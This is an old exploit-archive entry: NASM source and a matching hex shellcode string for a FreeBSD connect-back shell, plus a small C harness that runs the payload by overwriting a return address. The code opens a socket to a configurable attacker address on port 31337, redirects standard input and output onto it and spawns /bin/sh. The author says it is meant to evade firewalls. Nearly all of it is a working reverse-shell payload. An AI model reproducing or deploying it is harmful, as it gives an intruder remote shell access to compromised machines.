; Passive Connection Shellcode
;
; Coded by Scrippie - ronald@grafix.nl - http://b0f.freebsd.lublin.pl
; Buffer0verfl0w Security
; Why? This evades firewalls...
;
; YES, this is for NASM, I detest AT&T syntaxis - it's gross and unreadable
;
; This is the FreeBSD variant I whipped up
;
; Tnx to dvorak for pointing out that BSD's int 80h assumes a stored EIP
; on the stack before making it and that BSD has a somwhat different
; sockaddr_in structure (containing sin_len)

        BITS 32

; Equates - keeps this stuff a lot more clear

PORT            equ 31337       ; What an eleet port!

_exit           equ 1           ; See /usr/src/sys/kern/syscalls.c
execve          equ 59          ; See /usr/src/sys/kern/syscalls.c
dup2            equ 90          ; See /usr/src/sys/kern/syscalls.c
socket          equ 97          ; See /usr/src/sys/kern/syscalls.c
connect         equ 98          ; See /usr/src/sys/kern/syscalls.c

IPPROTO_TCP     equ 6           ; See netinet/in.h
PF_INET         equ 2           ; See sys/socket.h
SOCK_STREAM     equ 1           ; See sys/socket.h

sockaddr_in_off equ 0
shell_off       equ 8
shell_ptr_off   equ 16

        jmp short EndCode

Start:
        pop esi                 ; Get offset data in esi

        xor eax, eax
        xor ebx, ebx

        mov bl, IPPROTO_TCP     ; Push IPPROTO_TCP
        push ebx
        mov bl, SOCK_STREAM     ; Push SOCK_STREAM
        push ebx
        mov bl, PF_INET         ; Push PF_INET
        push ebx
        push ebx                ; Skipped by int 80h
        mov al, socket          ; Select socket() syscall

        int 80h                 ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        mov edx, eax            ; Save the resulting socket descriptor

        mov byte [esi+sockaddr_in_off+1], PF_INET ; sin_family -> PF_INET
        mov word [esi+sockaddr_in_off+2], PORT  ; Set the port number

        mov bl, 16                      ; sizeof(sockaddr_in)
        push ebx

        lea ebx, [esi+sockaddr_in_off]  ; Get offset sockaddr_in into ebx
        push ebx                        ; Push it
        push eax                        ; Still holds sockfd
        push eax                        ; Canary value

        mov al, connect                 ; Select connect() syscall
        int 80h                         ; connect(sockfd, sockaddr_in, 10)

        xor ebx, ebx
        push ebx
        push edx
        mov al, dup2                    ; Select dup2 syscall

        push eax                        ; Ruined
        int 80h

        inc bl
        push ebx
        push edx
        mov al, dup2                    ; Do the same for stdout

        push eax
        int 80h

        inc bl
        push ebx
        push edx
        mov al, dup2                    ; And finally for stderr

        push eax
        int 80h

        xor ebx, ebx
        push ebx                ; *envp == NULL

        lea edi, [esi+shell_off+7]
        xor eax, eax
        xor ecx, ecx
        mov cl, 9
        repe stosb

        lea ebx, [esi+shell_off]        ; Get offset shell into ebx
        mov [esi+shell_ptr_off], ebx    ; Store it at shell_off
        lea ecx, [esi+shell_ptr_off]    ; Get offset shell_off into ecx
        push ecx                        ; argp
        push ebx                        ; command

        push eax                ; canary
        mov al, execve
        int 80h                 ; Spawn the frikkin' shell

        mov al, _exit           ; _exit() system call
        int 80h                 ; Do it

EndCode:
        call Start

sockaddr_in     db 'ABCC'               ; A=sin_len - B=sin_family - C=port
                dd 0x100007f            ; IP addr (s_addr) in htonl() form
; 8 bytes not needed ;)

shell           db '/bin/sh' ;,0
;shell_ptr      db 1,2,3,4

------------------------------------------------------------------------------

And here's the shellcode equivalent


char shellcode[]=
"\xeb\x68\x5e\x31\xc0\x31\xdb\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x53\xb0\x61\x
cd\x80\x89\xc2\xc6\x46\x01\x02\x66\xc7\x46\x02\x69\x7a\xb3\x10\x53\x8d\x1e\x53\
x50\x50\xb0\x62\xcd\x80\x31\xdb\x53\x52\xb0\x5a\x50\xcd\x80\xfe\xc3\x53\x52\xb0
\x5a\x50\xcd\x80\xfe\xc3\x53\x52\xb0\x5a\x50\xcd\x80\x31\xdb\x53\x8d\x7e\x0f\x3
1\xc0\x31\xc9\xb1\x09\xf3\xaa\x8d\x5e\x08\x89\x5e\x10\x8d\x4e\x10\x51\x53\x50\x
b0\x3b\xcd\x80\xb0\x01\xcd\x80\xe8\x93\xff\xff\xff\x41\x42\x43\x43\x7f\x00\x00\
x01\x2f\x62\x69\x6e\x2f\x73\x68";				    ^

						             Start of IP addr

void main() {
        int *ret;

        ret = (int *)&ret + 2;
        (*ret) = (int)shellcode;

}

// milw0rm.com [2004-09-26]